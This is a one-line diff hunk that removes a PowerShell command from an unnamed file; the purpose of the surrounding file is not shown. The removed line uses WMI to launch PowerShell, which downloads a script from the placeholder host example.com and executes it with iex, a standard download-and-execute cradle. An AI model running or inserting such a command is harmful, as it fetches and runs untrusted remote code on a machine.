@@ -1,1 +1,0 @@
-Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -c "iex (New-Object Net.WebClient).DownloadString(''http://example.com/script.ps1'')"'
